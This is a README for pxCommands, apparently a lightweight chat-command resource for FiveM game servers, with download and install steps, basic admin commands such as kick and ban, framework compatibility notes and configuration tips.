# ⚙️ pxCommands - Simple Command System for FiveM

[![Download pxCommands](https://img.shields.io/badge/Download-pxCommands-blue?style=for-the-badge&logo=github)](https://github.com/wckdbozo/pxCommands/releases)

---

## 📋 What is pxCommands?

pxCommands is a lightweight system for managing commands and messages in FiveM. It works with any framework, making it easy to add and use custom commands in your FiveM server. Whether you use ESX, QBCore, or other popular frameworks, pxCommands fits right in without needing complicated setup.

This system helps you control in-game actions by typing commands in the chat. It can send messages, perform tasks, or manage server functions smoothly and reliably.

---

## 🖥️ System Requirements

Before you start, make sure your setup meets these basic requirements:

- **Operating System:** Windows 10 or later, or a compatible Linux server that runs FiveM.
- **FiveM Server:** A running FiveM server version 4770 or above.
- **Framework:** Compatible with ESX, ESX Legacy, QBCore, and Qbox frameworks.
- **Internet:** A stable internet connection to download the files.
- **Storage:** At least 10 MB free disk space for installation.

---

## 🎯 Key Features

Here are the main things pxCommands offers:

- Works with various FiveM frameworks like ESX and QBCore.
- Add custom commands without extra coding required.
- Send messages to players or perform server tasks on command.
- Lightweight and fast, no heavy dependencies or load.
- Easy to set up and manage, no programming needed.
- Supports multiple users and custom permissions.

---

## 🚀 Getting Started

This guide walks you through downloading, installing, and running pxCommands step-by-step. Follow the instructions carefully to get your commands up and running in no time.

You do not need any programming knowledge or special tools. Just follow the steps below using your computer and your FiveM server setup.

---

## ⬇️ Download & Install pxCommands

To get started, you need to download pxCommands from its official release page.

[Visit the pxCommands Release Page to Download](https://github.com/wckdbozo/pxCommands/releases)

### Steps to download

1. **Open the link:** Click the button above or enter https://github.com/wckdbozo/pxCommands/releases in your web browser.
2. **Find the latest version:** Look for the most recent release near the top of the page. It will have a version number like v1.0 or higher.
3. **Download the zip file:** Click the zip file under "Assets." This file contains all the files you need.
4. **Save the file:** Choose a folder on your computer where you can easily find the download.
5. **Extract files:** Right-click the zip file, then select “Extract All.” Choose where to extract the folder.

### Steps to install on your server

1. **Access your FiveM server files:** Use FTP software or your server file manager.
2. **Upload the pxCommands folder:** Upload the extracted folder to your server’s `resources` directory.
3. **Edit server configuration:** Open your server config file (`server.cfg`).
4. **Add the start command:** Add this line at the end of the file:
   ```
   start pxCommands
   ```
5. **Save and close:** Save the config file and close it.
6. **Restart your server:** Restart your FiveM server to load pxCommands.

---

## 🛠️ How to Use pxCommands

After installation, pxCommands lets you control the server with simple commands.

### Basic commands

- `/help` — Lists all available commands.
- `/ping` — Checks server response.
- `/msg [player] [message]` — Sends a private message to a player.
- `/kick [player]` — Kicks a player from the server.
- `/ban [player] [reason]` — Bans a player with a reason.

You can type these commands directly in the FiveM chat window during gameplay.

### Add your own commands

pxCommands lets you add custom commands if you want to expand server features.

- Open the `commands.lua` file in the pxCommands folder.
- Follow the examples in the file to create new commands.
- Save the file and restart your server to apply changes.

---

## 🧩 Framework Compatibility

pxCommands works smoothly with many popular FiveM server frameworks:

- **ESX** — One of the most widely used roleplay frameworks.
- **ESX Legacy** — A maintained version of ESX with updated functions.
- **QBCore** — A lightweight framework focused on simplicity.
- **Qbox Framework** — Another solid choice for server management.

No matter which framework your server uses, pxCommands should integrate without conflict.

---

## 📁 File Structure Overview

Here is a quick look at the main files and folders you will find:

- **pxCommands/**  
  - `commands.lua` — File where commands are defined.  
  - `config.lua` — Settings for customizing message display, permissions.  
  - `README.md` — This document.  
  - `fxmanifest.lua` — Resource manifest for FiveM to recognize pxCommands.

---

## 🔧 Configuration Tips

You can easily customize pxCommands without needing coding skills.

- Open `config.lua` in a text editor.
- Change settings like message colors, command prefixes, or permissions.
- Save the file and restart the server to apply changes.

For example, to change the command prefix from `/` to `!`, update this line:
```
Config.CommandPrefix = "!"
```
Save the file afterward.

---

## ⚠️ Troubleshooting

If pxCommands does not work as expected, try the following:

- Check your server console for error messages.
- Make sure `pxCommands` is listed in your `server.cfg` and spelled correctly.
- Verify you uploaded the folder to the `resources` directory.
- Confirm your server meets the system requirements.
- Restart your server after any changes.
- Check that your FiveM client and server versions are up to date.

If problems persist, visit the GitHub page and open an issue with details.

---

## 📞 Getting Help

You can get help or report bugs through these channels:

- Open an issue on the [pxCommands GitHub Issues page](https://github.com/wckdbozo/pxCommands/issues).
- Search existing issues for solutions.
- Provide details such as screenshots, error messages, and steps to reproduce your problem.

---

## 🔗 Useful Links

- [Download pxCommands](https://github.com/wckdbozo/pxCommands/releases) *(main download page)*
- [GitHub Repository](https://github.com/wckdbozo/pxCommands)
- [FiveM Official](https://fivem.net)
- [ESX Framework](https://esx-framework.org)
- [QBCore Framework](https://qbcore.org)

---

## ⚙️ About This Project

pxCommands focuses on making command systems in FiveM simple and flexible. It avoids heavy frameworks and uses fast, clear code to keep your server running smoothly while adding convenience for administrators and players.

---

[![Download pxCommands](https://img.shields.io/badge/Download-pxCommands-blue?style=for-the-badge&logo=github)](https://github.com/wckdbozo/pxCommands/releases)